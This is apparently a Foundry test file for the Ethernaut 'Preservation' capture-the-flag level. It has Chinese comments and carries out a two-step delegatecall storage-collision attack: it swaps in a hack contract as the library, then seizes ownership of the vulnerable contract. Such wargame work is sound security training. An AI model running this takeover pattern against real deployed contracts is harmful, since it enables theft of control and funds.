// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/level16_preservation/preservation.sol";

contract Level16Test is Test {
    LibraryContract t1;
    LibraryContract t2;
    Preservation p1;
    HackPreservation hack;
    address A = address(0x1234);
    address B = address(0x9a65D28F9e195fcbf9599bA0F0552Dc6129DfB2c);

    function setUp() public {
        vm.deal(A, 0.1 ether);
        vm.deal(B, 0.2 ether);

        vm.startPrank(A, A);
        t1 = new LibraryContract();
        t2 = new LibraryContract();
        p1 = new Preservation(address(t1), address(t2));
        vm.stopPrank();

        vm.startPrank(B, B);
        hack = new HackPreservation();
        vm.stopPrank();
    }

    function testHack() public {
        // 开始前确认下owner
        assertEq(p1.owner(), A);

        vm.startPrank(B, B);

        // 第一次调用
        p1.setFirstTime(uint256(uint160(address(hack))));
        // 确认第一个更新生效了
        assertEq(address(hack), address(p1.timeZone1Library()));

        // 第二次调用
        p1.setFirstTime(uint256(uint160(address(B))));
        // 确认第二个更新生效了
        assertEq(p1.owner(), address(B));

        vm.stopPrank();
    }
}
